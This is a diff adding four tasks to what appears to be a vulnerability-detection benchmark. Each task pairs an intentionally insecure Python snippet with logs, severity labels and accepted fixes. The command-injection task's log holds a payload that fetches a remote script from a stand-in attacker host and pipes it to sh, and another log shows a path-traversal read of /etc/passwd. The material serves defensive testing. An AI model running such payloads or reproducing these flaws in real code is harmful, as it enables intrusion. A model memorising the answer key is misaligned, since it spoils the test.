@@ -255,6 +255,159 @@ TASKS: list[TaskSpec] = [
         ],
         difficulty=Difficulty.HARD,
     ),
+    TaskSpec(
+        task_id="medium_command_injection_01",
+        language="python",
+        context="Backend diagnostics helper executes shell commands from user-provided input.",
+        code=(
+            "import os\n"
+            "\n"
+            "def ping_target(user_input: str) -> int:\n"
+            "    return os.system('ping ' + user_input)\n"
+        ),
+        logs=["WARN diagnostics input=8.8.8.8; curl http://attacker.tld/payload.sh | sh"],
+        vulnerabilities=[
+            VulnerabilitySpec(
+                vuln_id="command_injection_ping_exec",
+                type=VulnerabilityType.COMMAND_INJECTION,
+                line=4,
+                severity=Severity.HIGH,
+                aliases=["command injection", "os command injection", "shell injection"],
+                accepted_fixes=[
+                    "Use subprocess with argument list instead of shell command concatenation.",
+                    "Sanitize and strictly validate user input against allowed host patterns.",
+                    "Avoid shell execution paths and never use shell=True for untrusted input.",
+                ],
+            )
+        ],
+        difficulty=Difficulty.MEDIUM,
+    ),
+    TaskSpec(
+        task_id="medium_path_traversal_01",
+        language="python",
+        context="File-serving API reads requested files from a static content folder.",
+        code=(
+            "from flask import request\n"
+            "\n"
+            "def read_file():\n"
+            "    filename = request.args.get('filename', '')\n"
+            "    with open('/var/www/files/' + filename, 'r', encoding='utf-8') as f:\n"
+            "        return f.read()\n"
+        ),
+        logs=["ALERT file read attempt filename=../../../../etc/passwd"],
+        vulnerabilities=[
+            VulnerabilitySpec(
+                vuln_id="path_traversal_file_read",
+                type=VulnerabilityType.PATH_TRAVERSAL,
+                line=5,
+                severity=Severity.HIGH,
+                aliases=["path traversal", "directory traversal", "file traversal"],
+                accepted_fixes=[
+                    "Normalize and validate the requested path before opening files.",
+                    "Restrict access to an allowed base directory after path resolution.",
+                    "Validate filename input and reject traversal sequences.",
+                ],
+            )
+        ],
+        difficulty=Difficulty.MEDIUM,
+    ),
+    TaskSpec(
+        task_id="hard_broken_auth_rate_limit_01",
+        language="python",
+        context="Login API compares plaintext credentials and allows unlimited retry attempts.",
+        code=(
+            "from flask import request\n"
+            "\n"
+            "USERS = {'admin': 'Admin123!'}\n"
+            "\n"
+            "def login():\n"
+            "    username = request.json.get('username', '')\n"
+            "    password = request.json.get('password', '')\n"
+            "    if password == USERS.get(username):\n"
+            "        return {'ok': True}, 200\n"
+            "    return {'ok': False}, 401\n"
+        ),
+        logs=[
+            "WARN repeated failed logins for admin from 203.0.113.44 attempts=132",
+            "INFO no retry throttling or lockout policy applied",
+        ],
+        vulnerabilities=[
+            VulnerabilitySpec(
+                vuln_id="broken_auth_plaintext_compare",
+                type=VulnerabilityType.BROKEN_AUTHENTICATION,
+                line=8,
+                severity=Severity.CRITICAL,
+                aliases=["broken auth", "authentication flaw", "weak authentication"],
+                accepted_fixes=[
+                    "Use hashed password storage and constant-time verification.",
+                    "Replace plaintext password comparison with secure hash comparison.",
+                    "Enforce robust authentication controls and credential policies.",
+                ],
+            ),
+            VulnerabilitySpec(
+                vuln_id="missing_login_rate_limit",
+                type=VulnerabilityType.RATE_LIMITING,
+                line=10,
+                severity=Severity.HIGH,
+                aliases=["no rate limiting", "missing rate limiting", "brute force vulnerability"],
+                accepted_fixes=[
+                    "Implement login rate limiting per IP and account.",
+                    "Add retry limits and account lockout or backoff policies.",
+                    "Throttle repeated authentication failures to prevent brute force abuse.",
+                ],
+            ),
+        ],
+        difficulty=Difficulty.HARD,
+    ),
+    TaskSpec(
+        task_id="hard_sensitive_data_logging_01",
+        language="python",
+        context="Production service logs user secrets and runs with debug mode enabled.",
+        code=(
+            "from flask import Flask, request\n"
+            "\n"
+            "app = Flask(__name__)\n"
+            "\n"
+            "@app.post('/signup')\n"
+            "def signup():\n"
+            "    password = request.json.get('password', '')\n"
+            "    print('User password:', password)\n"
+            "    return {'ok': True}\n"
+            "\n"
+            "app.run(debug=True)\n"
+        ),
+        logs=[
+            "ERROR User password: P@ssw0rd! logged during signup",
+            "INFO Flask app started with debug=True in production",
+        ],
+        vulnerabilities=[
+            VulnerabilitySpec(
+                vuln_id="sensitive_data_exposed_in_logs",
+                type=VulnerabilityType.SENSITIVE_DATA_EXPOSURE,
+                line=8,
+                severity=Severity.CRITICAL,
+                aliases=["data leak", "sensitive data exposure", "logging secrets"],
+                accepted_fixes=[
+                    "Remove sensitive data from logs and never print plaintext secrets.",
+                    "Mask or redact credentials before logging application events.",
+                    "Adopt secure logging controls for secrets and user data.",
+                ],
+            ),
+            VulnerabilitySpec(
+                vuln_id="insecure_debug_mode_enabled",
+                type=VulnerabilityType.DEBUG_CONFIGURATION,
+                line=11,
+                severity=Severity.HIGH,
+                aliases=["debug mode enabled", "insecure debug", "debug=true in production"],
+                accepted_fixes=[
+                    "Disable debug mode in production environments.",
+                    "Use environment-based configuration to control debug settings.",
+                    "Deploy with production-safe server settings and no interactive debugger.",
+                ],
+            ),
+        ],
+        difficulty=Difficulty.HARD,
+    ),
 ]
 
 
